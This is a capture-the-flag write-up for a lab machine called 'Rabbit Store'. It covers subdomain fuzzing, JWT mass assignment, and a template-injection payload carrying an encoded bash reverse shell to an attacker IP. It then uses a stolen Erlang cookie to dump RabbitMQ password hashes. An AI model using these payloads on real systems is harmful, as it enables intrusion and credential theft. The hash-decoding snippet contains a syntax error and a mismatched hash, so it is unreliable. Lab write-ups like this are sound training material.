# Rabbit store writeup

## quickly

```Nmap scan report
Host is up (0.037s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  7 07:08:29 2025 -- 1 IP address (1 host up) scanned in 160.33 seconds

Add cloudsite.thm to /etc/hosts

ffuf -u http://cloudsite.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cloudsite.thm" | grep 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 34ms]


Add storage.cloudsite.thm to /etc/hosts

Create account and login

error but there is a jwt token in cookies
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNpZEB0aG0uY29tIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NDEzMjc5MzgsImV4cCI6MTc0MTMzMTUzOH0.hIh-xXFtZ5V3j9adLHau9NiZmwWECgJJMP28TN0kxac

jwt.io

{
  "email": "sid@thm.com",
  "subscription": "inactive",
....
}

create new account and use burpsuite to add "subscription": "active"

```
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 42
Origin: http://storage.cloudsite.thm
DNT: 1
Connection: keep-alive

{"email":"sid2@thm.com","password":"test", "subscription":"active"
}

POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNpZDJAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTMyODM3MywiZXhwIjoxNzQxMzMxOTczfQ.Q4y9qA0_SE622GXynYDhaWTa8BtI8L0ePkPZw_M6yZo
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 169

{
	"username": "{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMC4xNDYvMTA2NjYgMD4mMQ==|base64 -d|bash').read()}}"
}
```

nc -lnvp 10666

## reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
stty raw -echo ; fg

azrael@forge:/var/lib/rabbitmq$ ls -a
.  ..  config  .erlang.cookie  erl_crash.dump  mnesia  nc  schema
azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie 
G1Ub8H9zkeliT37t

sudo rabbitmqctl --erlang-cookie 'G1Ub8H9zkeliT37t' --node rabbit@forge list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []
root    [administrator]

sudo rabbitmqctl --erlang-cookie 'G1Ub8H9zkeliT37t' --node rabbit@forge export_definitions /tmp/definitions.json
Exporting definitions in JSON to a file at "/tmp/definitions.json" ...
```

```
cat /tmp/definitions.json 
{
    "bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]
}
``` 

root hash is 49e6hSldHRai9uxhSBHtGU+YBzWF

```
import hashlib
import binascii

user_hash = '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF''
password_hash = binascii.a2b_base64(user_hash)
decoded_hash = password_hash.hex()
part1 = decoded_hash[:8]
part2 = decoded_hash[8:]

print(part2)

python3 decode_root.py
```

password is:
295d1....585
